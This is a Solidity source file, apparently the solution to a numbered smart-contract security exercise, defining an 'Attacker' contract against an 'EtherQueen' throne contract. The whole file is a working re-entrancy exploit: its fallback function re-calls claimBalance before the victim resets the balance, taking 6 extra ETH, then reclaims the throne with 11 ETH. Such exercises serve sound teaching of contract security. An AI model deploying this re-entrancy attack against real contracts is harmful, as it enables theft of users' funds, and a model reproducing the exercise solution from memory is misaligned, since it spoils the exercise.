// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {EtherQueen} from "../src/Problem5.sol";

contract Attacker {

    EtherQueen queen; // The smart contract to exploit.
    bool hasReentered; // Has re-entered the queen contract?

    // Initialize the contract variables.
    constructor(EtherQueen _eq) {
        queen = _eq;
        hasReentered = false;
    }

    // Claim the throne with 6 ETH.
    function claimThrone() public {
        queen.claimThrone{value: 6 ether}();
    }

    // Claim the balance (6 ETH). The fallback will collect
    // 6 more ETH. Claim the throne with 11 ETH.
    function attack() public payable {
        queen.claimBalance();
        queen.claimThrone{value: 11 ether}();
    }

    // Standard re-entrancy. When receive the old balance of 6 ETH,
    // claim that balance again. Our balance hasn't been set to
    // 0 yet, so we can claim 6 more ETH.
    fallback() external payable {
        if (!hasReentered) {
            hasReentered = true;
            queen.claimBalance();
        }
    }

}